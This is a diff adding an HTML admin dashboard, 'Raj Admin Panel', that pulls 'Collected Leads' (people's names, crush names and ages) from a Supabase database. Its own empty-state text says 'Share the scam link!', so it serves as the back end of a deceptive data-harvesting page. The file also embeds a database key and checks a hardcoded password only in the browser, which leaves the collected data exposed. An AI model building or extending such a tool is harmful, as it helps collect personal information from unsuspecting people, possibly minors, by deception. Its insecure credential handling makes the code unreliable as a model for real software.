@@ -1,0 +1,323 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Admin Panel | Raj</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css">
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+
+        body {
+            font-family: 'Segoe UI', system-ui, -apple-system, sans-serif;
+            background: #0a0f1a;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            overflow-x: hidden;
+            position: relative;
+        }
+
+        body::before {
+            content: '';
+            position: fixed;
+            top: -50%;
+            left: -50%;
+            width: 200%;
+            height: 200%;
+            background: radial-gradient(circle at 30% 30%, rgba(0, 255, 136, 0.08) 0%, transparent 50%),
+                        radial-gradient(circle at 70% 70%, rgba(255, 77, 109, 0.08) 0%, transparent 50%);
+            animation: bgMove 12s infinite alternate ease-in-out;
+            z-index: -1;
+        }
+
+        @keyframes bgMove {
+            0% { transform: translate(0, 0) scale(1); }
+            100% { transform: translate(2%, 2%) scale(1.05); }
+        }
+
+        .panel { width: 90%; max-width: 900px; z-index: 1; }
+
+        .login-card {
+            background: rgba(22, 27, 34, 0.85);
+            backdrop-filter: blur(20px);
+            border: 1px solid rgba(0, 255, 136, 0.2);
+            border-radius: 20px;
+            padding: 40px 30px;
+            text-align: center;
+            box-shadow: 0 20px 50px rgba(0,0,0,0.5), 0 0 30px rgba(0,255,136,0.15);
+            animation: fadeInUp 0.6s ease;
+        }
+
+        @keyframes fadeInUp {
+            from { opacity: 0; transform: translateY(30px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+
+        .login-card .icon-circle {
+            width: 80px; height: 80px; border-radius: 50%;
+            background: linear-gradient(135deg, #00ff88, #00bcd4);
+            display: flex; align-items: center; justify-content: center;
+            margin: 0 auto 20px;
+            box-shadow: 0 0 25px rgba(0,255,136,0.5);
+            font-size: 2.5em; color: #0a0f1a;
+        }
+
+        .login-card h2 { color: #fff; font-weight: 600; margin-bottom: 15px; font-size: 1.8em; letter-spacing: 1px; }
+        .login-card p { color: #8b949e; margin-bottom: 25px; font-size: 0.9em; }
+
+        .input-group { display: flex; gap: 10px; justify-content: center; flex-wrap: wrap; }
+
+        .input-group input {
+            padding: 14px 20px; width: 70%; max-width: 300px;
+            background: #0d1117; border: 2px solid rgba(0,255,136,0.3);
+            border-radius: 12px; color: #00ff88; font-size: 1em; outline: none;
+            transition: 0.3s;
+        }
+
+        .input-group input:focus { border-color: #00ff88; box-shadow: 0 0 15px rgba(0,255,136,0.2); }
+
+        .btn {
+            padding: 14px 28px; background: linear-gradient(135deg, #00ff88, #00bcd4);
+            border: none; border-radius: 12px; color: #0a0f1a; font-weight: bold;
+            cursor: pointer; transition: 0.3s; font-size: 1em;
+            display: inline-flex; align-items: center; gap: 8px;
+        }
+
+        .btn:hover { transform: translateY(-2px); box-shadow: 0 10px 25px rgba(0,255,136,0.3); }
+
+        .error-msg {
+            color: #ff4d6d; margin-top: 15px; display: none; font-weight: 500;
+            animation: shake 0.4s ease;
+        }
+
+        @keyframes shake {
+            0%,100% { transform: translateX(0); }
+            25% { transform: translateX(-6px); }
+            75% { transform: translateX(6px); }
+        }
+
+        .main-content { display: none; animation: fadeInUp 0.5s ease; }
+        .main-content.show { display: block; }
+
+        .header {
+            display: flex; justify-content: space-between; align-items: center;
+            margin-bottom: 25px; flex-wrap: wrap; gap: 15px;
+        }
+
+        .header h1 {
+            color: #00ff88; font-size: 2em; font-weight: 700;
+            display: flex; align-items: center; gap: 10px;
+        }
+
+        .header h1 i {
+            font-size: 0.9em; background: rgba(0,255,136,0.1);
+            padding: 12px; border-radius: 12px;
+        }
+
+        .refresh-btn {
+            padding: 10px 20px; background: rgba(255,255,255,0.05);
+            border: 1px solid rgba(255,255,255,0.1); border-radius: 10px;
+            color: #c9d1d9; cursor: pointer; transition: 0.3s;
+            display: flex; align-items: center; gap: 8px;
+        }
+
+        .refresh-btn:hover { background: rgba(0,255,136,0.1); border-color: #00ff88; }
+
+        .table-container {
+            background: rgba(22,27,34,0.8); backdrop-filter: blur(15px);
+            border: 1px solid rgba(255,255,255,0.08); border-radius: 20px;
+            overflow: hidden; box-shadow: 0 15px 35px rgba(0,0,0,0.4);
+        }
+
+        table { width: 100%; border-collapse: collapse; }
+
+        thead th {
+            background: linear-gradient(135deg, rgba(0,255,136,0.15), rgba(0,188,212,0.1));
+            color: #00ff88; padding: 16px 20px; text-align: left;
+            font-weight: 600; font-size: 0.9em; letter-spacing: 1px; text-transform: uppercase;
+        }
+
+        tbody td {
+            padding: 14px 20px; border-bottom: 1px solid rgba(255,255,255,0.05);
+            color: #c9d1d9; font-size: 0.95em; transition: background 0.2s;
+        }
+
+        tbody tr { animation: rowFadeIn 0.4s ease forwards; opacity: 0; }
+
+        @keyframes rowFadeIn { to { opacity: 1; } }
+
+        tbody tr:hover { background: rgba(0,255,136,0.05); }
+        tbody tr:last-child td { border-bottom: none; }
+
+        .loading-row td { text-align: center; padding: 30px; color: #8b949e; }
+
+        .loading-spinner {
+            display: inline-block; width: 30px; height: 30px;
+            border: 3px solid rgba(0,255,136,0.3); border-top-color: #00ff88;
+            border-radius: 50%; animation: spin 0.8s linear infinite;
+        }
+
+        @keyframes spin { to { transform: rotate(360deg); } }
+
+        .no-data { text-align: center; padding: 30px; color: #8b949e; }
+    </style>
+</head>
+<body>
+    <div class="panel">
+        <!-- Login Screen -->
+        <div id="loginScreen" class="login-card">
+            <div class="icon-circle">
+                <i class="fas fa-shield-haltered"></i>
+            </div>
+            <h2>Raj Admin Panel</h2>
+            <p>Enter secret key to continue</p>
+            <div class="input-group">
+                <input type="password" id="passwordInput" placeholder="Password" autofocus>
+                <button class="btn" id="loginBtn"><i class="fas fa-arrow-right"></i> Unlock</button>
+            </div>
+            <div class="error-msg" id="loginError">Invalid password! Try again.</div>
+        </div>
+
+        <!-- Data Screen -->
+        <div id="dataScreen" class="main-content">
+            <div class="header">
+                <h1>
+                    <i class="fas fa-database"></i> Collected Leads
+                </h1>
+                <button class="refresh-btn" id="refreshBtn">
+                    <i class="fas fa-sync-alt"></i> Refresh Data
+                </button>
+            </div>
+            <div class="table-container">
+                <table>
+                    <thead>
+                        <tr>
+                            <th>S.No</th>
+                            <th>Name</th>
+                            <th>Crush Name</th>
+                            <th>Your Age</th>
+                            <th>Crush Age</th>
+                            <th>Timestamp</th>
+                        </tr>
+                    </thead>
+                    <tbody id="tableBody">
+                        <!-- rows inserted dynamically -->
+                    </tbody>
+                </table>
+            </div>
+        </div>
+    </div>
+
+    <!-- SINGLE MODULE SCRIPT – NO MORE "supabase is not defined" -->
+    <script type="module">
+        import { createClient } from 'https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2/+esm';
+
+        const SUPABASE_URL = 'https://qtimngonyrzmalkdxzqb.supabase.co';
+        const SUPABASE_ANON_KEY = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6InF0aW1uZ29ueXJ6bWFsa2R4enFiIiwicm9sZSI6ImFub24iLCJpYXQiOjE3ODE2Nzg5NzEsImV4cCI6MjA5NzI1NDk3MX0.qCnu97ZyWiQAtIjdKXQOB7AS2WnzzZpKjnqC9CLQCkc';
+        const supabaseClient = createClient(SUPABASE_URL, SUPABASE_ANON_KEY);
+
+        const ADMIN_PASSWORD = 'r123'; // Change this if you want
+
+        // DOM elements
+        const loginScreen = document.getElementById('loginScreen');
+        const dataScreen = document.getElementById('dataScreen');
+        const passwordInput = document.getElementById('passwordInput');
+        const loginBtn = document.getElementById('loginBtn');
+        const loginError = document.getElementById('loginError');
+        const tableBody = document.getElementById('tableBody');
+        const refreshBtn = document.getElementById('refreshBtn');
+
+        // Login logic
+        loginBtn.addEventListener('click', attemptLogin);
+        passwordInput.addEventListener('keypress', (e) => {
+            if (e.key === 'Enter') attemptLogin();
+        });
+
+        function attemptLogin() {
+            if (passwordInput.value === ADMIN_PASSWORD) {
+                loginScreen.style.display = 'none';
+                dataScreen.classList.add('show');
+                fetchLeads();
+            } else {
+                loginError.style.display = 'block';
+                passwordInput.value = '';
+                // shake effect
+                loginError.style.animation = 'none';
+                loginError.offsetHeight; // trigger reflow
+                loginError.style.animation = 'shake 0.4s ease';
+                setTimeout(() => {
+                    loginError.style.display = 'none';
+                }, 2000);
+            }
+        }
+
+        // Fetch from Supabase
+        async function fetchLeads() {
+            tableBody.innerHTML = `
+                <tr class="loading-row">
+                    <td colspan="6">
+                        <div class="loading-spinner"></div>
+                        <div style="margin-top:10px;">Loading data...</div>
+                    </td>
+                </tr>
+            `;
+
+            try {
+                const { data, error } = await supabaseClient
+                    .from('leads')
+                    .select('*')
+                    .order('created_at', { ascending: false });
+
+                if (error) throw error;
+
+                if (!data || data.length === 0) {
+                    tableBody.innerHTML = `
+                        <tr>
+                            <td colspan="6" class="no-data">
+                                <i class="fas fa-inbox" style="font-size:2em; display:block; margin-bottom:10px;"></i>
+                                No entries yet. Share the scam link!
+                            </td>
+                        </tr>
+                    `;
+                    return;
+                }
+
+                tableBody.innerHTML = data.map((lead, index) => `
+                    <tr style="animation-delay: ${index * 0.05}s;">
+                        <td>${index + 1}</td>
+                        <td><strong>${escapeHtml(lead.your_name)}</strong></td>
+                        <td><i class="fas fa-heart" style="color:#ff4d6d; margin-right:5px;"></i>${escapeHtml(lead.crush_name)}</td>
+                        <td>${lead.your_age ?? '-'}</td>
+                        <td>${lead.crush_age ?? '-'}</td>
+                        <td>${new Date(lead.created_at).toLocaleString()}</td>
+                    </tr>
+                `).join('');
+
+            } catch (err) {
+                console.error(err);
+                tableBody.innerHTML = `
+                    <tr>
+                        <td colspan="6" style="text-align:center; color:#ff4d6d; padding:20px;">
+                            <i class="fas fa-exclamation-circle"></i> Failed to load data. Check console.
+                        </td>
+                    </tr>
+                `;
+            }
+        }
+
+        refreshBtn.addEventListener('click', fetchLeads);
+
+        // Simple XSS prevention
+        function escapeHtml(text) {
+            if (!text) return '';
+            return text.replace(/&/g, '&amp;')
+                       .replace(/</g, '&lt;')
+                       .replace(/>/g, '&gt;')
+                       .replace(/"/g, '&quot;')
+                       .replace(/'/g, '&#039;');
+        }
+    </script>
+</body>
+</html>
